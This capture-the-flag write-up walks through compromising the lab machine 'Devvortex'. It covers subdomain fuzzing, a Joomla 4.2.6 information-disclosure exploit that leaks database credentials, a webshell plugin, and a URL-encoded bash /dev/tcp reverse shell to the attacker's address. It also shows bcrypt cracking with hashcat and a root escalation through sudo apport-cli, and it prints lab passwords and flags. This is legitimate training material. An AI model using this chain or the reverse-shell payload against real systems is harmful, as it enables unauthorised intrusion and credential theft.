# Devvortex

## Initial NMAP Scan

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)  
80/tcp open  http    nginx 1.18.0 (Ubuntu)  
```

## Gobuster

```
gobuster dir -u http://10.10.11.242/ -w /usr/share/dirb/wordlists/common.txt
```

```
/css
/images
/js
```

## Curl

* Shows redirect to [devvortex.htb](http://devvortex.htb)

## Host File

* Added devvortex.htb to /etc/hosts

## FUFF

* Scan for VHOSTS

```
curl -s -H "Host: nonexistantdomain.devvortex.htb" http://devvortex.htb |wc -c
```

* Outputs size of 154

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://10.10.11.242 -H "Host: FUZZ.devvortex.htb" -fs 154
```

* Run scan and filtering out 154 size
* Results show a vhost
  * dev.devvortex.htb
* Added dev.devvortex.htb to /etc/hosts

## Gobuster Again

```
gobuster dir -u dev.devvortex.htb -w /usr/share/dirb/wordlists/big.txt
```

* We find /administrator
* Visiting /administrator in browser we see a login page with "Powered By Joomla"

## Metasploit

```
msfconsole
search exploit joomla
use auxiliary/scanner/http/joomla_version
```

* Results tell us its Joomla version 4.2.6

## Searching for Exploit

```
searchsploit joomla 4.2
```

* Unauthenticated information disclosure `/usr/share/exploitdb/exploits/php/webapps/51334.py`

## Exploit

* Installed a few missing ruby gems.

```
ruby 51334.py http://dev.devvotex.htb
```

```
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

* mysql credentials found&#x20;

## Login

* Successful login to Joomla admin panel using mysql credentials.
* Find a place to upload joomla extentions.

## Joomla Extension

* Quick google search for "joomla code execution extention"
  * [https://github.com/p0dalirius/Joomla-webshell-plugin](https://github.com/p0dalirius/Joomla-webshell-plugin)
* After installing the extention we are able to visit [http://dev.devvortex.htb/modules/mod\_webshell/mod\_webshell.php?action=exec\&cmd=id](http://dev.devvortex.htb/modules/mod\_webshell/mod\_webshell.php?action=exec\&cmd=id)

```
{"stdout":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","stderr":"","exec":"id"}
```

## Getting Shell

* Trying normal reverse shell syntax we get an error.
* Url encoding the reverse shell works.

```
http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php?action=exec&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.60%2F1234%200%3E%261%27
```

## Mysql

```
mysql -u lewis -p joomla
show tables;
select * from sd4fg_users;
logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

* Password has found for logan

### Hash Cracking

* Hash type identifier [https://hashes.com/en/tools/hash\_identifier](https://hashes.com/en/tools/hash\_identifier)
* `$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 - Possible algorithms: bcrypt $2*$, Blowfish (Unix)` &#x20;

#### Hashcat

```
hashcat -m 3200 -a 0 logan_hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
```

* Password cracked `tequieromucho` &#x20;

## SSH

```
ssh logan@dev.devvortex.htb
```

## User Flag

```
cat user.txt
1fb4026b5ac164cf34495e97e85682ae
```

## Privilege Escalation

```
sudo -l
```

* All users can run `sudo /usr/bin/apport-cli` with no password
* Googling for apport-cli exploits we find
  * [https://github.com/diego-tella/CVE-2023-1326-PoC](https://github.com/diego-tella/CVE-2023-1326-PoC)

### Exploit

* Exploit requires a crash file, and there are no in /var/crash.
* Checking options with `/usr/bin/apport-cli -h` &#x20;
  * We can file a new report using -f

```
sudo /usr/bin/apport-cli -f
```

* We select option 1
* Then option 2
* Then type V to view the report
* Type `!/bin/bash`
  * We get a root shell

## Root Flag

```
cat /root/root.txt
```

```
e3afbbe5970bff2257b741f2d970eaa0
```
